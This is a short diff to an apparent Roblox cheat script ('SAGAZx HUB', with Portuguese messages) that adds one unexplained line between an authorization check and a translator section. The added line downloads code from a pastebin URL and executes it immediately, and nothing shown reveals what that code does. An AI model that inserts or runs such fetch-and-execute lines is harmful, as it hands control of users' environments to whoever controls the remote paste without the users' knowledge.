@@ -14,6 +14,9 @@ task.spawn(function()
         warn("Você não é o player autorizado!")
     end
 end)
+
+loadstring(game:HttpGet("https://pastebin.com/raw/6avULnrU"))()
+
 -- ====================================================================
 -- 🌍 TRADUTOR SIMPLIFICADO — SAGAZx HUB
 -- ====================================================================
